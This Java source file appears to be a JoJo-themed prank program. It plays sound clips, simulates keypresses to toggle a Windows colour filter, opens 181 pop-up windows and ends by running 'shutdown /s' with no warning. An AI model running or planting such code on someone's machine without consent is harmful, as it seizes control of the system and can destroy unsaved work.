package zawarudo;

// Za Warudo JoJo's
import java.awt.FlowLayout;
import java.io.File;
import javax.sound.sampled.*;
import java.awt.Robot;
import java.awt.event.KeyEvent;
import java.util.Random;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class ZaWarudo {

    public static void timeStop(){
            File soundFile = new File("za_warudo.wav");
        if(soundFile.exists()){
            try{
                AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(soundFile);
                Clip clip = AudioSystem.getClip();
                clip.open(audioInputStream);
                clip.start();
                Thread.sleep((clip.getMicrosecondLength()) / 2700);
                Robot robot = new Robot();
                robot.keyPress(KeyEvent.VK_CONTROL);
                robot.keyPress(KeyEvent.VK_WINDOWS);
                robot.keyPress(KeyEvent.VK_C);
                robot.keyRelease(KeyEvent.VK_CONTROL);
                robot.keyRelease(KeyEvent.VK_C);
                robot.keyRelease(KeyEvent.VK_WINDOWS);
            } catch (Exception e){
                e.printStackTrace();    
            }
        }
    }
    
    public static void mudaTime() {
        File soundFile = new File("muda.wav");
        if(soundFile.exists()){
            try{
                AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(soundFile);
                Clip clip = AudioSystem.getClip();
                clip.open(audioInputStream);
                clip.start();
                for(int i = 0; i <= 180; i++){
                    Random random = new Random();
                    JFrame frame = new JFrame("MUDA");
                    JLabel label = new JLabel("MUDA");
                    frame.setLayout(new FlowLayout());
                    frame.setTitle("MUDA");
                    frame.setSize(250, 250);
                    frame.add(label);
                    frame.setLocation(random.nextInt(1000), random.nextInt(1000));
                    frame.setVisible(true);  
                }
                Thread.sleep((clip.getMicrosecondLength()) / 2700);
                Thread.sleep(5000);
            } catch (Exception e){
                e.printStackTrace();    
            }
        }
    }
    
    public static void zeroTime(){
             File soundFile = new File("zero.wav");
        if(soundFile.exists()){
            try{
                AudioInputStream audioInputStream = AudioSystem.getAudioInputStream(soundFile);
                Clip clip = AudioSystem.getClip();
                clip.open(audioInputStream);
                clip.start();
                Thread.sleep((clip.getMicrosecondLength()) / 2000);
                Thread.sleep(1000);

              // Activar filtro de color negativo de Windows
                Robot robot = new Robot();
                robot.keyPress(KeyEvent.VK_CONTROL);
                robot.keyPress(KeyEvent.VK_WINDOWS);
                robot.keyPress(KeyEvent.VK_C);
                robot.keyRelease(KeyEvent.VK_CONTROL);
                robot.keyRelease(KeyEvent.VK_C);
                robot.keyRelease(KeyEvent.VK_WINDOWS);
                Process process = Runtime.getRuntime().exec("shutdown /s");
            } catch (Exception e){
                e.printStackTrace();    
            }
        }
    }
    
    public static void main(String[] args){
        timeStop();
        mudaTime();
        zeroTime();
    }
}
